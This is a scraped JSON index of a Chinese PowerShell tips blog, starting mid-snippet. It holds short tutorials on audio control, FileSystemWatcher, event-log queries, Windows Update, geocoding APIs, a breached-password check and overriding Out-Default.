System.Runtime.InteropServices;[Guid(&quot;5CDF2C82-841E-4546-9722-0CF74078229A&quot;), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IAudioEndpointVolume { // f(), g(), ... are unused COM method slots. Define these if you care int f(); int g(); int h(); int i(); int SetMasterVolumeLevelScalar(float fLevel, System.Guid pguidEventContext); int j(); int GetMasterVolumeLevelScalar(out float pfLevel); int k(); int l(); int m(); int n(); int SetMute([MarshalAs(UnmanagedType.Bool)] bool bMute, System.Guid pguidEventContext); int GetMute(out bool pbMute);}[Guid(&quot;D666063F-1587-4E43-81F1-B948E807363F&quot;), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice { int Activate(ref System.Guid id, int clsCtx, int activationParams, out IAudioEndpointVolume aev);}[Guid(&quot;A95664D2-9614-4F35-A746-DE8DB63617E6&quot;), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator { int f(); // Unused int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid(&quot;BCDE0395-E52F-467C-8E3D-C4579291692E&quot;)] class MMDeviceEnumeratorComObject { }public class Audio { static IAudioEndpointVolume Vol() { var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator; IMMDevice dev = null; Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(/*eRender*/ 0, /*eMultimedia*/ 1, out dev)); IAudioEndpointVolume epv = null; var epvid = typeof(IAudioEndpointVolume).GUID; Marshal.ThrowExceptionForHR(dev.Activate(ref epvid, /*CLSCTX_ALL*/ 23, 0, out epv)); return epv; } public static float Volume { get {float v = -1; Marshal.ThrowExceptionForHR(Vol().GetMasterVolumeLevelScalar(out v)); return v;} set {Marshal.ThrowExceptionForHR(Vol().SetMasterVolumeLevelScalar(value, System.Guid.Empty));} } public static bool Mute { get { bool mute; Marshal.ThrowExceptionForHR(Vol().GetMute(out mute)); return mute; } set { Marshal.ThrowExceptionForHR(Vol().SetMute(value, System.Guid.Empty)); } }}'@# query audio volume and mute status[Audio]::Volume[Audio]::Mute# unmute[Audio]::Mute = $false# set volume to 50% (range 0.0 - 1.0)[Audio]::Volume = 0.5]","link":"/2019/05/24/controlling-audio-volume-and-mute-status/"},{"title":"PowerShell 技能连载 - 开发 PowerShell Core 还是 Windows PowerShell 脚本","text":"您可能知道，有两种类型的 PowerShell：随着 Windows 操作系统分发的 Windows PowerShell 是基于完整的 .NET Framework而 PowerShell 6 以及更高版本是开源、跨平台，并且基于（有限的）.NET Core 和 Standard。 如果您开发能够在两类系统上执行的脚本，那非常棒！不过如果如果知道您的代码是基于其中的一个系统，请确保在脚本的顶部添加合适的 #requires 语句。 这段代码只能在 PowerShell 6 及更高版本运行（假设您已事先将它保存为文件）： 12#requires -PSEdition Core&quot;This runs in PowerShell 6 and better only...&quot; 类似地，以下代码只能在 Windows PowerShell 中运行： 12#requires -PSEdition Desktop&quot;This runs in Windows PowerShell only...&quot;","link":"/2019/05/27/marking-scripts-for-powershell-core-or-windows-powershell/"},{"title":"PowerShell 技能连载 - 对循环启用流操作","text":"PowerShell 包含许多循环构造。这些循环构造不能变成流，所以您无法将结果通过管道传递给其它 cmdlet 并且享受管道的实时性优势。相反，您必须先将所有数据存储在变量中，并且只有当循环结束之后才可以将变量通过管道传递给其它命令。 虽然您可以用 ForEach-Object 来代替传统的 foreach 和 for 循环，但它会减慢代码的执行速度，并且不是代替 while 和 do 循环的方案。 以下是一个对所有循环启用快速流的简单技巧。让我们从这个非常简单的循环开始： 123456789# stupid sample using a do loop# a more realistic use case could be a database querydo{ $val = Get-Random -Minimum 0 -Maximum 10 $val} while ($val -ne 6) 它会一直循环直到达到随机数 6。您会发现无法实时将结果传输到管道，所以你必须使用类似这样的方法来对结果进行排序或者用它们来做其他事情： 12345678$all = do{ $val = Get-Random -Minimum 0 -Maximum 10 $val} while ($val -ne 6)$all | Out-GridView 通过将循环封装到一个脚本块中，您可以获得实时流：更少的内存消耗，立即得到结果： 123456&amp; { do{ $val = Get-Random -Minimum 0 -Maximum 10 $val} while ($val -ne 6) } | Out-GridView","link":"/2019/05/28/turn-on-streaming-for-loops/"},{"title":"PowerShell 技能连载 - 通过 Index Search 搜索文件","text":"Windows 索引服务能够对您的用户数据文件进行索引，并且在文件资源管理器中快速搜索。以下是一个基于内容返回文件的函数： 1234567891011121314function Search-FileContent ([String][Parameter(Mandatory)]$FilterText, $Path = $home ){ $objConnection = New-Object -COM ADODB.Connection $objRecordset = New-Object -COM ADODB.Recordset $objConnection.Open(&quot;Provider=Search.CollatorDSO;Extended properties='Application=Windows';&quot;) $objRecordset.Open(&quot;SELECT System.ItemPathDisplay FROM SYSTEMINDEX WHERE Contains('&quot;&quot;$FilterText&quot;&quot;') AND SCOPE='$Path'&quot;, $objConnection) While (!$objRecordset.EOF ) { $objRecordset.Fields.Item(&quot;System.ItemPathDisplay&quot;).Value $null = $objRecordset.MoveNext() }} 要使用它，请指定一个关键字。以下代码返回所有包含该关键字的文件： 12PS&gt; Search-FileContent -FilterText testcase -Path C:\\Users\\tobwe\\Documents\\C:\\Users\\tobwe\\Documents\\Development\\experiment1.zip 如你快速发现的，Index Search 并不会返回 PowerShell 脚本（*.ps1 文件）。缺省情况下，PowerShell 脚本并没有被索引。如果您希望通过内容搜索到这些文件，请到 Index Service 设置并且包含 PowerShell 脚本。点击这里了解更多：https://devblogs.microsoft.com/scripting/use-windows-search-to-find-your-powershell-scripts/","link":"/2019/05/29/searching-files-using-index-search/"},{"title":"PowerShell 技能连载 - 内置的 RSAT 工具","text":"远程服务器管理工具 (RSAT) 过去是一个外部下载，添加了两个重要的 PowerShell 模块：ActiveDirectory 和 GroupPolicy。不幸的是，主要的 Windows 更新移除了已安装的 RSAT 工具，所以如果您的脚本需要客户端的 Active Dicrectory 命令，那么需要人工确定并且下载合适新版 Windows 10 的 RSAT 包并且手工安装它。 在 Windows 10 Build 1809 和以后的版本中，这要更容易一些。您可以通过 PowerShell 以类似这样的方式控制 RSAT 状态（假设您有管理员特权）： 123456789PS&gt; Get-WindowsCapability -Online -Name *RSAT.ActiveDirectory*Name : Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0State : NotPresentDisplayName : RSAT: Active Directory Domain Services and Lightweight Directory Services ToolsDescription : Active Directory Domain Services (AD DS) and Active Directory Lightweight Directory Services (AD LDS) Tools include snap-ins and command-line tools for remotely managing AD DS and AD LDS on Windows Server.DownloadSize : 5230337InstallSize : 17043386 要安装 RSAT，请运行以下代码： 1234567891011121314151617181920PS&gt; Get-WindowsCapability -Online -Name *RSAT.ActiveDirectory* | Add-WindowsCapability -OnlinePath :Online : TrueRestartNeeded : FalsePS&gt; Get-Module -Name ActiveDirectory -ListAvailable Directory: C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\ModulesModuleType Version Name ExportedCommands---------- ------- ---- ----------------Manifest 1.0.1.0 ActiveDirectory {Add-... 虽然在某些情况下仍然需要下载 RSAT 包，但您不再需要搜索正确的版本并手动构建。","link":"/2019/05/30/rsat-tools-built-in/"},{"title":"PowerShell 技能连载 - PowerShell 7","text":"今天我们不讨论代码，而是讨论 PowerShell 的总体情况。Microsoft 宣布了下一代 PowerShell 叫做 “PowerShell 7”，并且是基于 .NET Core 3.0 的。这是非常重大的变化，因为 .NET Core 3.0 重新引入了 WPF (Windows Presentation Foundation, GUI)，至少在 Windows 平台上。基于这个变化，PowerShell 可以重新引入 GUI 相关的 cmdlet 例如 Out-GridView，并且可以期待 PowerShell 7 能够弥补大多数使用 PowerShell 6 的 Windows 管理员所缺少的功能。 虽然在 PowerShell 7 之前，使用目前的版本也是可行的，但我们建议您关注新闻并阅读以下链接： https://devblogs.microsoft.com/powershell/the-next-release-of-powershell-powershell-7/","link":"/2019/05/31/powershell-7/"},{"title":"PowerShell 技能连载 - 使用代理服务器的缺省凭据","text":"如果您的公司使用一个需要身份认证的代理服务器，PowerShell 可能有时候无法访问 Internet。您可能需要通知代理服务器使用凭据缓存中的缺省凭据： 1[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultCredentials","link":"/2019/06/03/using-default-credentials-for-proxy/"},{"title":"PowerShell 技能连载 - 同步使用 FileSystemWatcher","text":"以下是一段演示 PowerShell 如何用 FileSystemWatcher 同步地监控一个包含字文件夹的文件夹变化： 1234567891011121314151617181920212223242526$folder = $home$filter = '*'try{ $fsw = New-Object System.IO.FileSystemWatcher $folder, $filter -ErrorAction Stop}catch [System.ArgumentException]{ Write-Warning &quot;Oops: $_&quot; return}$fsw.IncludeSubdirectories = $true$fsw.NotifyFilter = [IO.NotifyFilters]'FileName, LastWrite'do{ $result = $fsw.WaitForChanged([System.IO.WatcherChangeTypes]::All, 1000) if ($result.TimedOut) { continue } $result Write-Host &quot;Change in $($result.Name) - $($result.ChangeType)&quot;} while ($true) 这段代码将会监测用户配置文件中 FileName 和 LastWrite 属性的变化。 一个同步的监听器会导致 PowerShell 处于忙碌状态，所以要退出监听，需要设置一个 1000ms 的超时值，PowerShell 将会将控制权返回给你，而如果您没有按下 CTRL+C，则循环会继续。 请注意同步的 FileSystemWatcher 可能会错过改变：正好当 WaitForChange() 返回时一个文件发生改变，那么在下一次调用 WaitForChange() 之前的文件变化都会丢失。 如果不想错过任何变化，请使用异步的方法（请见下一个技能）。","link":"/2019/06/04/using-filesystemwatcher-synchronously/"},{"title":"PowerShell 技能连载 - 异步使用 FileSystemWatcher","text":"在前一个技能中我们介绍了 FileSystemWatcher 对象以及如何用它监控文件夹的变化。不过，为了不错过所有变化，需要使用异步的方法，类似这样： 123456789101112$FileSystemWatcher = New-Object System.IO.FileSystemWatcher$FileSystemWatcher.Path = &quot;$home\\Desktop&quot;$FileSystemWatcher.IncludeSubdirectories = $true$FileSystemWatcher.EnableRaisingEvents = $true Register-ObjectEvent -InputObject $FileSystemWatcher -SourceIdentifier Monitoring1 -EventName Created -Action { $Object = &quot;{0} was {1} at {2}&quot; -f $Event.SourceEventArgs.FullPath, $Event.SourceEventArgs.ChangeType, $Event.TimeGenerated Write-Host $Object -ForegroundColor Green} 在这个例子中，当检测到任何一个变化事件，就会触发一个事件，并且 FileSystemWatcher 继续监听。由 PowerShell 负责响应这个事件，并且它使用一个事件处理器来响应。事件处理器是在后台执行的。 如果不想使用后台事件管理器，请运行这行代码： 1Get-EventSubscriber -SourceIdentifier Monitoring1 | Unregister-Event 请注意每个支持的变更类型会发出不同的事件。在这个例子中，我们关注 “Created“ 事件，当创建新文件或新文件夹的时候会发出这个事件。要响应其它变化类型，请添加更多的事件处理器。这将返回所有支持的事件名称： 12345678910111213PS C:\\&gt; $FileSystemWatcher | Get-Member -MemberType *Event TypeName: System.IO.FileSystemWatcherName MemberType Definition---- ---------- ----------Changed Event System.IO.FileSystemEventHandler Changed(System.Object, System.IO.FileSystemEventArgs)Created Event System.IO.FileSystemEventHandler Created(System.Object, System.IO.FileSystemEventArgs)Deleted Event System.IO.FileSystemEventHandler Deleted(System.Object, System.IO.FileSystemEventArgs)Disposed Event System.EventHandler Disposed(System.Object, System.EventArgs)Error Event System.IO.ErrorEventHandler Error(System.Object, System.IO.ErrorEventArgs)Renamed Event System.IO.RenamedEventHandler Renamed(System.Object, System.IO.RenamedEventArgs)","link":"/2019/06/05/using-filesystemwatcher-asynchronously/"},{"title":"PowerShell 技能连载 - 检查按键","text":"有些时候如果一个脚本能检测按键，而不需要干预脚本和输入，那是很棒的事情。通过这种方式，您可以增加按住 SHIFT 键的逻辑，例如退出脚本或者启用详细日志。在用户数据脚本中，您可以在 PowerShell 启动时根据是否按下某些键加载模块以及进行其它调整。 这归结到一个问题：最好的以及最少干预的检测按键的方式是什么？以下是解决方案： 1234567891011121314Add-Type -AssemblyName WindowsBaseAdd-Type -AssemblyName PresentationCore1..1000 | ForEach-Object { &quot;I am at $_&quot; $isDown = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftShift) if ($isDown) { Write-Warning &quot;ABORTED!!&quot; break } Start-Sleep -Seconds 1} 增加了两个缺省的程序集之后，您的脚本可以操作 Windows.Input.Keyboard 类。这个类有一个 IsKeyDown() 方法。它可以检测键盘的按键，并且当该按键当前处于按下状态时会返回 $true。 以上示例代码持续运行知道用户按下左侧的 SHIFT 键。","link":"/2019/06/06/detecting-key-press/"},{"title":"PowerShell 技能连载 - 查看下载文件的大小","text":"当您用 PowerShell 从 internet 下载文件，您可能会想知道下载需要多少时间。您可以检查已下载的数据大小，而且在知道总下载尺寸的情况下可以计算进度百分比。 以下是得到文件尺寸的快速方法： 123456789101112131415161718function Get-DownloadSize{ [CmdletBinding()] param ( [Parameter(Mandatory,ValueFromPipeline)] [String] $Url ) process { $webRequest = [System.Net.WebRequest]::Create($Url) $response = $webRequest.GetResponse() $response.ContentLength $response.Dispose() }} 以下是一个示例： 123PS&gt; &quot;https://github.com/PowerShell/PowerShell/releases/download/v6.2.1/PowerShell-6.2.1-win-x64.zip&quot; | Get-DownloadSize58716786","link":"/2019/06/07/finding-size-of-download/"},{"title":"PowerShell 技能连载 - 解析 URL","text":"经常有一种情况，URL 重定向到另一个最终的 URL。这种情况下，如果您希望知道一个指定的 URL 究竟指向哪，可以用类似这样的函数： 12345678910111213141516171819function Resolve-Url{ [CmdletBinding()] param ( [Parameter(Mandatory)] [string] $url ) $request = [System.Net.WebRequest]::Create($url) $request.AllowAutoRedirect=$false $response = $request.GetResponse() $url = $response.GetResponseHeader(&quot;Location&quot;) $response.Close() $response.Dispose() return $url} 例如，最新的 PowerShell 总是在这个 URL 发布：https://github.com/PowerShell/PowerShell/releases/latest 解析这个 URL，就可以获取最新的 URL。这是找到可用的最新 PowerShell 版本的快速方法： 1234567891011PS C:\\&gt; Resolve-Url -url https://github.com/PowerShell/PowerShell/releases/latesthttps://github.com/PowerShell/PowerShell/releases/tag/v6.2.1PS C:\\&gt; ((Resolve-Url -url https://github.com/PowerShell/PowerShell/releases/latest) -split '/')[-1]v6.2.1PS C:\\&gt; [version](((Resolve-Url -url https://github.com/PowerShell/PowerShell/releases/latest) -split '/')[-1] -replace 'v')Major Minor Build Revision----- ----- ----- --------6 2 1 -1","link":"/2019/06/10/resolving-urls-2/"},{"title":"PowerShell 技能连载 - 查找登录事件","text":"假设您有管理员特权，以下是一个快速、简单地转储所有登录事件的方法。这样你就可以知道谁登录了一台特定的电脑，以及使用了哪种身份验证类型： 123456789101112131415#requires -RunAsAdministratorGet-EventLog -LogName Security -InstanceId 4624 | ForEach-Object { [PSCustomObject]@{ Time = $_.TimeGenerated LogonType = $_.ReplacementStrings[8] Process = $_.ReplacementStrings[9] Domain = $_.ReplacementStrings[5] User = $_.ReplacementStrings[6] Method = $_.ReplacementStrings[10] Source = $_.Source } } | Out-GridView","link":"/2019/06/11/finding-logon-events/"},{"title":"PowerShell 技能连载 - 谁执行了隐藏的程序？","text":"有没有想过为什么 CPU 负载有时会这么高，或者为什么黑色的窗口会一闪而过？我们可以检查程序启动的事件日志，并找出什么时候什么程序自动启动了： 12345678910111213Get-EventLog -LogName System -InstanceId 1073748869 |ForEach-Object { [PSCustomObject]@{ Date = $_.TimeGenerated Name = $_.ReplacementStrings[0] Path = $_.ReplacementStrings[1] StartMode = $_.ReplacementStrings[3] User = $_.ReplacementStrings[4] }} | Out-GridView","link":"/2019/06/12/who-is-starting-hidden-programs/"},{"title":"PowerShell 技能连载 - 寻找丢失的更新","text":"PowerShell 可以使用 Windows Update 客户端相同逻辑查询缺少的更新： 1234$UpdateSession = New-Object -ComObject Microsoft.Update.Session$UpdateSearcher = $UpdateSession.CreateupdateSearcher()$Updates = @($UpdateSearcher.Search(&quot;IsHidden=0 and IsInstalled=0&quot;).Updates)$Updates | Select-Object Title 下面是返回更新标题和知识库编号（如果可用）的更复杂的方法： 12345678910111213141516171819$UpdateSession = New-Object -ComObject Microsoft.Update.Session$UpdateSearcher = $UpdateSession.CreateupdateSearcher()$Updates = @($UpdateSearcher.Search(&quot;IsHidden=0 and IsInstalled=0&quot;).Updates)$Updates |ForEach-Object { $pattern = 'KB\\d{6,9}' if ($_.Title -match $pattern) { $kb = $matches[0] } else { $kb = 'N/A' } [PSCustomObject]@{ Title = $_.Title KB = $kb }} | Out-GridView","link":"/2019/06/13/finding-missing-updates/"},{"title":"PowerShell 技能连载 - 查找已安装的更新（第 1 部分）","text":"Get-Hotfix 返回已安装的更新，但实际上只是 Win32 Win32_QuickFixEngineering WMI 类的一个包装器。它并不会返回所有已安装的更新。 一个更好的方法可能是查询事件日志： 1234567Get-EventLog -LogName System -InstanceId 19 | ForEach-Object { [PSCustomObject]@{ Time = $_.TimeGenerated Update = $_.ReplacementStrings[0] } } 虽然这可能不完整，并且事件日志项有可能被清除。唯一权威的答案可能来自 Windows Update 客户端，它实际上是查看系统中的文件： 12345678910111213$pattern = 'KB\\d{6,9}'$UpdateSession = New-Object -ComObject Microsoft.Update.Session$UpdateSearcher = $UpdateSession.CreateupdateSearcher()$Updates = @($UpdateSearcher.Search(&quot;IsInstalled=1&quot;).Updates)$Updates | ForEach-Object { $kb = 'N/A' if ($_.Title -match $pattern) { $kb = $matches[0] } [PSCustomObject]@{ KB = $kb Title = $_.Title }}","link":"/2019/06/14/finding-installed-updates-part-1/"},{"title":"PowerShell 技能连载 - 查找已安装的更新（第 2 部分）","text":"Windows 更新客户端维护了它自己的已安装更新。下面的示例代码不是查询一般的系统事件日志，也不是主动搜索可能需要一些时间的更新，而是查询和读取 Windows Update 客户端的安装历史： 12345$Session = New-Object -ComObject Microsoft.Update.Session $Searcher = $Session.CreateUpdateSearcher() $HistoryCount = $Searcher.GetTotalHistoryCount() $Searcher.QueryHistory(1,$HistoryCount) | Select-Object Date, Title, Description, SupportUrl","link":"/2019/06/17/finding-installed-updates-part-2/"},{"title":"PowerShell 技能连载 - 订阅锁定和解锁事件","text":"当一个用户锁定或者解锁机器时，Windows 会发出事件。PowerShell 可以订阅这些事件并且进行操作，例如使用文字转语音引擎来发出问候。 但是还有许多有用的操作。您也许希望在锁定计算机时做清理操作，关闭所有的 Windows 资源管理器窗口，开始备份，或做其它事情。以下是示例代码： 123456789101112131415161718192021function Start-LogMessage { $null = Register-ObjectEvent -InputObject ([Microsoft.Win32.SystemEvents]) -SourceIdentifier SessSwitch -EventName &quot;SessionSwitch&quot; -Action { Add-Type -AssemblyName System.Speech $synthesizer = New-Object -TypeName System.Speech.Synthesis.SpeechSynthesizer switch($event.SourceEventArgs.Reason) {'SessionLock'{ $synthesizer.Speak(&quot;Have a good one, $env:username!&quot;) }'SessionUnlock'{ $synthesizer.Speak(&quot;Heya, nice to see you $env:username again!&quot;) } } }}function Stop-LogMessage { $events = Get-EventSubscriber -SourceIdentifier SessSwitch $jobs = $events | Select-Object -ExpandProperty Action $events | Unregister-Event $jobs | Remove-Job}","link":"/2019/06/18/subscribe-to-lock-and-unlock-events/"},{"title":"PowerShell 技能连载 - Left Side of Comparison","text":"当使用比较运算符时，请确保明确的部分放在左边。这是因为 PowerShell 查找运算符的左边并且可能会自动改变右侧的数据类型。并且，当左侧是数组类型时，比较运算符可以作为过滤器使用。 请查看差异： 1234567$array = @()'-'* 80$array -eq $null'-'* 80$null -eq $array'-'* 80 由于要比较数组，比较操作符的工作原理类似于过滤器，在第一个比较中不返回任何内容。而当您交换操作数，结果会返回 $false，这才是正确的答案：一个数组，甚至是一个空的数组，不等于 null。","link":"/2019/06/19/left-side-of-comparison/"},{"title":"PowerShell 技能连载 - 使用 GeoCoding（第 1 部分）","text":"去年，Google 改变了他们的服务条款，要求使用一个独立的 API 入口来使用他们的 geocode API。幸运的是，还有免费的替代，所以在这个迷你系列中我们想向您展示 PowerShell 可以如何处理地址和坐标。 所有这些功能需要 REST API 调用，所以无论需要通过 REST API 发送什么信息，都需要先编码成能做为 Web URL 的一部分发送的格式。 我们先聚焦在如何将文本编码为 REST API 调用的一部分： 123$address = 'Bahnhofstrasse 12, Hannover'$encoded = [Net.WebUtility]::UrlEncode($address)$encoded 当您查看结果时，您可以很容易地看到进行了许多修改： Bahnhofstrasse+12%2C+Hannover","link":"/2019/06/21/working-with-geocoding-part-1/"},{"title":"PowerShell 技能连载 - 在 Web Request 中使用会话变量","text":"有些时候，Web Request 在浏览器中可以正常工作，但是在 PowerShell 中却不能。例如，当您在浏览器中导航到 http://www.geocode.xyz/Bahnhofstrasse,Hannover?json=1，可以获得 JSON 格式的坐标地址。 而当在 PowerShell 中做同样操作时，会得到奇怪的异常： 12$url = 'http://www.geocode.xyz/Bahnhofstrasse,Hannover?json=1'Invoke-RestMethod -Uri $url 结果如下： 1Invoke-RestMethod : { &quot;success&quot;: false, &quot;error&quot;: { &quot;code&quot;: &quot;006&quot;, &quot;message&quot;: &quot;Request Throttled.&quot; } } 这里的秘密是需要先获取会话状态，会话状态包括 cookie 和其它细节，然后再根据会话状态重新提交 Web Service 请求。以下是它的工作方式： 12345$url = 'http://www.geocode.xyz'$urlLocation = &quot;$url/Bahnhofstrasse,Hannover?json=1&quot;$null = Invoke-RestMethod -Uri $url -SessionVariable sessionInvoke-RestMethod -Uri $urlLocation -WebSession $session 现在结果看起来正确了： 123456standard : @{stnumber=1; addresst=Bahnhofstrasse; postal=30159; region=DE; prov=DE; city=Hannover; countryname=Germany; confidence=0.8}longt : 9.73885alt :elevation :latt : 52.37418","link":"/2019/06/20/using-session-variables-in-web-requests/"},{"title":"PowerShell 技能连载 - 使用 GeoCoding：将地址转换为经纬度（第 2 部分）","text":"让我们从将地址转换为经纬度坐标开始。我们假设您已经阅读了前面的部分以完全理解代码示例。 下面是一些示例代码，它接受任意数量的地址，并返回它们的经纬度： 12345678910111213141516'One Microsoft Way, Redmond','Bahnhofstrasse 12, Hannover, Germany' | ForEach-Object -Begin {$url = 'https://geocode.xyz' $null = Invoke-RestMethod $url -S session } -Process { $address = $_ $encoded = [Net.WebUtility]::UrlEncode($address) Invoke-RestMethod &quot;$url/${encoded}?json=1&quot; -W $session| ForEach-Object { [PSCustomObject]@{ Address = $address Long = $_.longt Lat = $_.latt } } } 结果看起来类似这样： Address Long Lat ------- ---- --- One Microsoft Way, Redmond -122.13061 47.64373 Bahnhofstrasse 12, Hannover, Germany 9.75195 52.37799","link":"/2019/06/24/geocoding-converting-addresses-to-lat-long-part-2/"},{"title":"PowerShell 技能连载 - 使用 GeoCoding：将经纬度转换为地址（第 3 部分）","text":"今天，我们要做相反的事情，把经纬度转换成一个地址： 1234567'52.37799,9.75195' | ForEach-Object -Begin {$url='https://geocode.xyz' $null = Invoke-RestMethod $url -S session } -Process { $coord = $_ Invoke-RestMethod &quot;$url/${address}?geoit=json&quot; -W $session }","link":"/2019/06/25/geocoding-converting-lat-long-to-addresses-part-3/"},{"title":"PowerShell 技能连载 - 使用 GeoCoding：情感分析（第 5 部分）","text":"某些地理编码 API 提供了复杂的情感分析，如下面的示例所示： 123456&quot;Most important museums of Amsterdam are located on the Museumplein, located at the southwestern side of the Rijksmuseum.&quot; | ForEach-Object -Begin {$url='https://geocode.xyz' $null = Invoke-RestMethod $url -S session } -Process { Invoke-RestMethod $url -W $session -Method Post -Body @{scantext=$_;geoit='json';sentiment='analysis'} } 一段文本被发送到 API，并且 API 分析了地理内容且输出文本中找到的地理位置的详细信息： 123456789sentimentanalysis : @{allsentiments=; sentimentwords=; mainsentiment=}longt : 4.88702matches : 3match : {@{longt=4.88355; location=RIJKSMUSEUM, AMSTERDAM, NL; matchtype=street; confidence=1.0; MentionIndices=108,26; latt=52.35976}, @{longt=4.88334; location=MUSEUMPLEIN, AMSTERDAM, NL; matchtype=street; confidence=1.0; MentionIndices=55,26; latt=52.35747}, @{longt=4.89416; location=Amsterdam,NL; matchtype=locality; confidence=0.4; MentionIndices=26; latt=52.36105}}latt : 52.35943","link":"/2019/06/27/geocoding-sentiment-analysis-part-5/"},{"title":"PowerShell 技能连载 - 使用 GeoCoding：文本扫描（第 4 部分）","text":"地理编码可以自动从文本中提取地理信息。这个例子还展示了向服务器提交信息的一种新方法：在下面的例子中，数据用的是 HTML 表单中使用的相同机制发布到服务器。这样做通常是为了避免使用 URL 编码大量数据，因为当使用 POST 时，数据在 request 的 header 而不是 URL 中传输。这也允许发送更多的数据： 1234567'Ma io stasera volevo cenare al lume di candela, non cucinarci! #Milano #blackout' | ForEach-Object -Begin {$url='https://geocode.xyz' $null = Invoke-RestMethod $url -S session } -Process { Invoke-RestMethod $url -W $session -Method Post -Body @{scantext=$_;geoit='json'} } 结果如下： longt matches match ----- ------- ----- 9.18067 1 {@{longt=9.18067; location=MILANO,IT; matchtype=locality; confidence=0.9; MentionIndices...","link":"/2019/06/26/geocoding-text-scanning-part-4/"},{"title":"PowerShell 技能连载 - 啤酒挑战结果：最短的密码分析代码","text":"最近在 psconf.eu 上有一个挑战，用最短的代码来检查以前密码被入侵的频率。以下是结果（感谢 Daniel Rothgänger）： 1[Net.ServicePointManager]::SecurityProtocol='Tls12''P@ssw0rd'|sc p -N;$a,$b=(FileHash p -A SHA1|% h\\*)-split'(?&lt;=^.{5})';((irm api.pwnedpasswords.com/range/$a)-split&quot;$b`:(\\d+)&quot;)[1] 您可以用这段代码做为思维游戏来了解它的功能，或者简单地使用它：它接受一个密码（在我们的示例中是“P@ssw0rd”）并返回一个数字。这个数字是这个特定密码在以前的攻击中出现的频率。任何被看到的密码都被认为是不安全的。只有不返回数字的密码才是安全的。","link":"/2019/06/28/beer-challenge-results-shortest-code-for-password-analysis/"},{"title":"PowerShell 技能连载 - 用 Out-GridView 做为输出窗口","text":"通常，Out-GridView 打开一个窗口并且显示所有通过管道传输到该 cmdlet 的内容： 1PS C:\\&gt; Get-Service | Out-GridView 然而，通过一点技巧，Out-GridView 就会变得更强大。您可以随时将信息通过管道传输到相同的输出窗口。 First, get yourself an instance of Out-GridView that thinks it is running in a pipeline:首先，获取一个 Out-GridView 的实例，然后认为它在一个管道中运行： 12$pipeline = { Out-GridView }.GetSteppablePipeline()$pipeline.Begin($true) 现在，您可以通过调用 “Process“ 来输出任何信息。每次调用 Process() 都好比将一个元素通过管道传给 cmdlet： 123$pipeline.Process('Hello this is awesome!')Start-Sleep -Seconds 4$pipeline.Process('You can output any time...') 当操作完成时，调用 End() 结束管道： 1$pipeline.End() 通过这种方式，您可以将信息记录到网格视图中，或者将其用作向用户显示结果的通用输出窗口。","link":"/2019/07/01/use-out-gridview-as-output-window/"},{"title":"PowerShell 技能连载 - 覆盖 Out-Default（第 1 部分）","text":"Out-Default 是一个隐藏的 PowerShell cmdlet，它在每个命令执行结束时被调用，并且将结果输出到控制台。您可以将这个函数覆盖为自己的版本，例如忽略所有输出，或输出一条“机密”消息： 1234function Out-Default{ 'SECRET!'} 以下是移除自定义覆盖函数的方法： 1PS C:\\&gt; del function:Out-Default","link":"/2019/07/03/overriding-out-default-part-1/"},{"title":"PowerShell 技能连载 - 覆盖 Out-Default（第 2 部分）","text":"当您覆盖 Out-Default 指令，做一些有意义的事情时，您需要确保原始的行为没有丢失，而只是加入新的功能。以下是一个使用“代理函数“概念的示例。 原始输入被转发（代理）到原始的 Out-Default cmdlet。此外，函数打开自己的私有 Out-GridView 窗口并将输出回显到该窗口。 12345678910111213141516171819202122232425262728293031323334353637383940function Out-Default{ param( [switch] $Transcript, [Parameter(ValueFromPipeline=$true)] [psobject] $InputObject ) begin { $pipeline = { Microsoft.PowerShell.Core\\Out-Default @PSBoundParameters }.GetSteppablePipeline($myInvocation.CommandOrigin) $pipeline.Begin($PSCmdlet) $grid = { Out-GridView -Title 'Results' }.GetSteppablePipeline() $grid.Begin($true) } process { $pipeline.Process($_) $grid.Process($_) } end { $pipeline.End() $grid.End() }}`要移除覆盖函数，只需要运行：```powershellPS C:\\&gt; del function:Out-Default","link":"/2019/07/05/overriding-out-default-part-2/"},{"title":"PowerShell 技能连载 - 覆盖 Out-Default（第 3 部分）","text":"高级的 PowerShell 用户常常发现他们在做以下三件事之一： 他们运行前面的命令并添加 Get-Member，以了解产生的对象的更多信息 他们运行前面的命令并添加 Select-Object * 来查看所有属性 他们运行前面的命令并将其通过管道传输到 Out-GridView 来查看图形化结果 这三条都可以更容易地实现，并且在所有 PowerShell 中都可工作，包括控制台、PowerShell ISE，或 Visual Studio Code。只需要覆盖 Out-Default 并且监听按键。当按下特定按键及回车键时，Out-Default 将会自动为您执行以上额外任务： 左方向键 + 回车按下时，对执行结果运行 Get-Member 并且将结果显示在网格视图中 右方向键 + 回车按下时，将所有执行结果显示在一个网格试图窗口中，这样您可以接触到数据 TAB + 回车按下时，将对结果执行 Select-Object *，同时也将结果显示在网格视图中 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788clsWrite-Host ([PSCustomObject]@{ 'Left Arrow + ENTER' = 'Show Member' 'Right Arrow + ENTER' = 'Echo results' 'Tab + ENTER' = 'Show all properties'} | Format-List | Out-String)function Out-Default{ param( [switch] ${Transcript}, [Parameter(ValueFromPipeline=$true)] [psobject] ${InputObject}) begin { $scriptCmd = {&amp; 'Microsoft.PowerShell.Core\\Out-Default' @PSBoundParameters } $steppablePipeline = $scriptCmd.GetSteppablePipeline($myInvocation.CommandOrigin) $steppablePipeline.Begin($PSCmdlet) Add-Type -AssemblyName WindowsBase Add-Type -AssemblyName PresentationCore $showGridView = [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::Right) $showAllProps = [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::Tab) $showMember = [System.Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::Left) if ($showGridView) { $cmd = {&amp; 'Microsoft.PowerShell.Utility\\Out-GridView' -Title 